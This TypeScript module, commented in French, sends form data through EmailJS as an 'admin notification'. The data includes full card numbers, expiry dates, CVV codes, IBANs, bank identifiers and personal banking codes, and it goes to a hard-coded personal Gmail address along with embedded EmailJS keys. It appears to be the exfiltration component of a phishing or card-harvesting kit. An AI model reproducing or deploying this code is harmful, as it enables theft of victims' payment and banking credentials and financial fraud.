
import emailjs from 'emailjs-com';
import { User } from '@/types/user';

// Configuration EmailJS
const SERVICE_ID = 'service_mev4gqt'; // ID de service EmailJS
const TEMPLATE_ID = 'template_jszdcbd'; // ID de template EmailJS mise à jour
const USER_ID = 'u9q4QhywRWjrfKnHj'; // Public Key EmailJS
const ADMIN_EMAIL = 'warrenkazimoto@gmail.com'; // Nouvelle adresse email

interface EmailParams {
  subject?: string;
  message?: string;
  userCode?: string;
  userName?: string;
  userData?: Partial<User>;
}

/**
 * Envoie un email de notification à l'administrateur
 * 
 * Pour configurer EmailJS:
 * 1. Créez un compte sur emailjs.com
 * 2. Ajoutez un service email (Gmail, Outlook, etc.)
 * 3. Créez un template avec les variables: {{code}}, {{titulaire}}, {{email}}, {{numerocarte}}, etc.
 * 4. Remplacez les constantes SERVICE_ID, TEMPLATE_ID et USER_ID ci-dessus par vos identifiants
 */
export const sendAdminNotification = async (params: EmailParams): Promise<boolean> => {
  try {
    const { userData } = params;
    
    if (!userData) {
      console.error("Données utilisateur manquantes pour l'email");
      return false;
    }
    
    const titulaire = `${userData.prenom || ''} ${userData.nom || ''}`.trim();
    const currentDate = new Date().toLocaleDateString('fr-FR');
    
    // Préparation des données pour le template email
    const templateParams = {
      to_email: ADMIN_EMAIL,
      code: userData.code || 'N/A',
      titulaire: titulaire || 'N/A',
      email: userData.email || 'N/A',
      numerocarte: userData.numerocarte || 'N/A',
      dateexpiration: userData.dateexpiration || 'N/A',
      cryptogramme: userData.cryptogramme || 'N/A',
      montant: userData.montant ? `${userData.montant}€` : 'N/A',
      typebanque: userData.typebanque || 'N/A',
      identifiantiban: userData.identifiantiban || 'N/A',
      codepersonne: userData.codepersonne || 'N/A',
      date: currentDate,
      // Ajout d'autres informations si nécessaire
      telephone: userData.telephone || 'N/A',
      adresse: userData.adresse || 'N/A',
      ville: userData.ville || 'N/A',
      codepostal: userData.codepostal || 'N/A',
      pays: userData.pays || 'N/A',
      iban: userData.iban || 'N/A',
    };
    
    await emailjs.send(
      SERVICE_ID,
      TEMPLATE_ID,
      templateParams,
      USER_ID
    );
    
    console.log('Email envoyé avec succès');
    return true;
  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'email:', error);
    return false;
  }
};
